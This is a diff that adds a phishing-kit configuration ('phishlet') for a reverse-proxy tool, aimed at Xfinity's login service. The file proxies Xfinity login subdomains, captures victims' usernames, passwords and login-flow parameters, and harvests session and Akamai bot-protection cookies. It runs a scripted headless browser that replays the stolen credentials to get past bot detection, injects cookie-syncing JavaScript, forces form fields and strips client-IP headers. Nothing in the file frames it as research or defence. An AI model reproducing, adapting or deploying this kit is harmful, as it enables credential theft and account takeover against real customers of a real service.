@@ -1,0 +1,247 @@
+min_ver: '3.0.0'
+
+# Xfinity Phishlet with Evilpuppet for Akamai Bot Manager bypass
+# January 2026 version
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'xfinity.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'idp', orig_sub: 'idp', domain: 'xfinity.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'oauth', orig_sub: 'oauth', domain: 'xfinity.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # Comprehensive domain replacements
+  - {triggers_on: 'xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'https://login.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'login.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'idp', domain: 'xfinity.com', search: 'https://idp.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'idp', domain: 'xfinity.com', search: 'idp.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'https://oauth.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'oauth.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  # Primary session tokens
+  - domain: '.xfinity.com'
+    keys: ['XFINITY-SSO', 'xsso', 'SC', 'bid', 'AMCV_*', 's_vi', 's_fid', 's_pers', 's_sess', 'isAuth', 'coax', 'cohsn_xs_id', 'r_hint', 'PSC', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-f']
+  # Akamai bot protection cookies (CRITICAL)
+  - domain: '.xfinity.com'
+    keys: ['_abck', 'bm_sz', 'ak_bmsc', 'bm_sv', 'bm_mi', 'AWSALB', 'AWSALBCORS', 'AWSALBTG', 'AWSALBTGCORS', 'OptanonConsent', 'OptanonAlertBoxClosed']
+  # Additional session cookies
+  - domain: '.login.xfinity.com'
+    keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq', 'last_idp_used']
+
+auth_urls:
+  - '/auth'
+  - '/overview'
+
+credentials:
+  # Username/Email capture
+  username:
+    key: 'user'
+    search: '(.*)'
+    # search: '(?:user|username|email|id|login)"?\s*[:=]\s*"?([^"&]+)"?'
+    type: 'post'
+    page: '/login'
+    
+  # Password capture (this happens on the next step)
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+    page: '/login'
+    
+  # Capture all flow parameters for proper redirection
+  custom:
+    - key: 'flowId'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 'flowStateId'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 'reqId'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 'r'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 's'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 'debug_body'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+
+# ============================================
+# EVILPUPPET CONFIGURATION FOR AKAMAI BYPASS
+# ============================================
+
+puppet:
+  enabled: true
+  triggers:
+    - id: "xfinity_persistent_login"
+      enabled: true
+      name: "Xfinity Persistent Login Flow"
+      domains: ["login.xfinity.com"]
+      paths: ["/login"]
+      auto_activate: true # Start puppet as soon as victim lands
+      open_url: "https://login.xfinity.com/login"
+      tokens: ["flowId", "flowStateId"]
+      extract_cookies: true
+      actions:
+        # Initial wait and cookie acceptance
+        - selector: '.hydrated, prism-input-text, form'
+          post_wait: 5000
+        - selector: '#onetrust-accept-btn-handler, #truste-consent-button'
+          click: true
+          timeout: 5000
+          post_wait: 10000
+        
+        # 1. Wait for username and fill it
+        - selector: 'input#user'
+          wait_cred: 'username' # Pause here until username is captured from victim
+          value: '{username}'
+          required: true
+          timeout: 15000
+          post_wait: 2000
+        - selector: '#sign_in'
+          click: true
+          required: true
+          timeout: 10000
+          post_wait: 10000
+        
+        # 2. Wait for password field and then wait for password value
+        - selector: 'input#passwd'
+          required: true
+          timeout: 20000
+          post_wait: 2000
+        - selector: 'input#passwd'
+          wait_cred: 'password' # Pause here until password is captured from victim
+          value: '{password}'
+          required: true
+          timeout: 15000
+          post_wait: 2000
+        
+        # 3. Final submission
+        - selector: '#sign_in'
+          click: true
+          required: true
+          timeout: 10000
+          post_wait: 7000
+        
+        # Wait for the authenticated page or session cookies
+        - selector: '.welcome-message, [href*="/auth"], #overview, .account-info, #user-menu'
+          timeout: 30000
+          post_wait: 5000
+
+  interceptors:
+    - token: 'flowId'
+      url_pattern: '.*'
+      abort: false
+    - token: 'flowStateId'
+      url_pattern: '.*'
+      abort: false
+
+# ============================================
+# JS INJECTION FOR COOKIE SYNC
+# ============================================
+
+js_inject:
+  - trigger_domains: ["login.xfinity.com"]
+    trigger_paths: ["/login"]
+    script: |
+      (function() {
+        var sid = "{session_id}";
+        var pollCount = 0;
+        var maxPolls = 20; // Poll for 2 minutes
+        
+        var pollPuppet = function() {
+          if (pollCount >= maxPolls) return;
+          pollCount++;
+          
+          console.log("Polling puppet for cookies (session: " + sid + ")...");
+          var xhr = new XMLHttpRequest();
+          // Any request to /s/{sid}/*.js will trigger puppet cookie injection
+          xhr.open("GET", "/s/" + sid + "/sync.js", true);
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+              console.log("Puppet sync successful.");
+              // After sync, if the page was "stuck", the next user action will succeed
+            }
+          };
+          xhr.send();
+          
+          setTimeout(pollPuppet, 6000);
+        };
+        
+        setTimeout(pollPuppet, 2000);
+      })();
+
+
+# ============================================
+# FORCE POST CONFIGURATION (COMPLEMENTARY)
+# ============================================
+
+force_post:
+  # First POST (email submission)
+  - path: /login
+    search:
+      - {key: 'flowStep', search: 'username'}
+    force:
+      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
+      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
+      - {key: 'r', value: 'pass'}
+      - {key: 's', value: 'pass'}
+    type: 'post'
+  
+  # Second POST (password submission)
+  - path: /login
+    search:
+      - {key: 'flowStep', search: 'password'}
+    force:
+      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
+      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
+      - {key: 'rememberMe', value: 'pass'}
+    type: 'post'
+
+# ============================================
+# LOGIN DETECTION
+# ============================================
+
+login:
+  domain: 'login.xfinity.com'
+  path: '/login'
+  detect:
+    - selector: 'form[action*="/login"] input[name="passwd"]'
+      type: 'visible'
+  redirect:
+    - url: 'https://www.xfinity.com'
+      conditional: true
+
+# ============================================
+# HEADERS CONFIGURATION
+# ============================================
+
+headers:
+  remove:
+    - 'X-Forwarded-For'
+    - 'X-Real-IP'
+  add:
+    - 'X-Forwarded-Proto: https'
+    - 'Sec-Fetch-Dest: document'
+    - 'Sec-Fetch-Mode: navigate'
+    - 'Sec-Fetch-Site: same-origin'
+    - 'Sec-Fetch-User: ?1'
